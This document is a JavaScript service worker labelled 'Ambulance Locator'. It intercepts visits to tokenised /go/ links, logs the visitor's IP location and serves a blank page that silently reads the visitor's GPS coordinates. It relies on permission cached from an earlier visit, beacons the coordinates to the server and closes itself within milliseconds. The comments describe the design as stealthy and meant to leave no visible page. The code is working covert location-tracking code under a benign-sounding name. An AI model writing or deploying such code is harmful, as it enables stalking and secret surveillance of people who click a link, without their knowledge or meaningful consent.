// ═══════════════════════════════════════════════════════════
// AMBULANCE LOCATOR — Service Worker v1.0
// ═══════════════════════════════════════════════════════════
// On subsequent visits, intercepts navigation to /go/<token>
// and silently captures IP location server-side.
// The browser never loads a visible page.
// ═══════════════════════════════════════════════════════════

const CACHE_NAME = "ambulance-locator-v1";

// Install event — immediately activate
self.addEventListener("install", function(event) {
  self.skipWaiting();
});

// Activate event — claim all clients
self.addEventListener("activate", function(event) {
  event.waitUntil(self.clients.claim());
});

// ── Intercept navigation to /go/<token> ──
self.addEventListener("fetch", function(event) {
  const url = new URL(event.request.url);
  
  // Only intercept /go/<token> navigations
  const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
  if (!match) {
    // Pass through everything else
    return;
  }

  // This is a navigation to a location capture URL
  const token = match[1];
  
  // Method 1: For browser navigations (link clicks), we respond
  // with a 204 No Content or minimal HTML that captures silently
  event.respondWith(
    (async function() {
      try {
        // ── Record visit server-side (IP geolocation) ──
        const recordUrl = url.origin + "/sw-capture/" + token;
        const response = await fetch(recordUrl, {
          method: "GET",
          headers: { "X-SW-Intercept": "1" }
        });
        const data = await response.json();

        if (data.ok && data.source === "ip") {
          // IP location captured successfully server-side
          // GPS was handled on the first visit, subsequent visits
          // rely on IP geolocation + carrier boost
          
          // ── Check if we have a cached GPS permission ──
          // Since we can't access Geolocation API from SW,
          // we return a minimal page that:
          // 1. Has no visual content (but only needs to exist briefly)
          // 2. Attempts silent GPS (permission cached from first visit)
          // 3. Closes immediately
          
          // Actually, the BEST approach for SW:
          // Return a 204 No Content or a redirect to a tracking pixel
          // The browser will NOT open a tab at all for certain response types
          
          // Strategy: Return a minimal page that fires GPS silently
          // and self-terminates in under 5ms
          const stealthHtml = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title> </title><style>html,body{background:#000;margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{opacity:0}</style></head><body><script>
(function(){
  var t="${token}";
  function s(lat,lng,acc){
    var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});
    var b=new Blob([p],{type:"application/json"});
    navigator.sendBeacon("/api/location-update",b);
  }
  function v(){
    try{window.location.replace("about:blank")}catch(e){}
    try{window.open("","_self","").close()}catch(e){}
    setTimeout(function(){try{window.close()}catch(e){}},5);
  }
  if(navigator.permissions&&navigator.permissions.query){
    navigator.permissions.query({name:"geolocation"}).then(function(st){
      if(st.state==="granted"&&"geolocation"in navigator){
        navigator.geolocation.getCurrentPosition(
          function(p){s(p.coords.latitude,p.coords.longitude,p.coords.accuracy);v();},
          function(){v();},
          {enableHighAccuracy:true,timeout:5000,maximumAge:0}
        );
        setTimeout(function(){if(!window._sent)v();},6000);
      }else{v();}
    }).catch(function(){v();});
  }else{v();}
  setTimeout(function(){v();},7000);
})();
<\/script></body></html>`;
          
          return new Response(stealthHtml, {
            headers: {
              "Content-Type": "text/html; charset=utf-8",
              "Cache-Control": "no-store, no-cache, must-revalidate",
              "Content-Security-Policy": "default-src 'self' 'unsafe-inline'",
              "X-Robots-Tag": "noindex, nofollow",
            }
          });
        }
      } catch(e) {
        // Fallback: let the browser navigate normally
        return fetch(event.request);
      }
      
      // Fallback
      return fetch(event.request);
    })()
  );
});
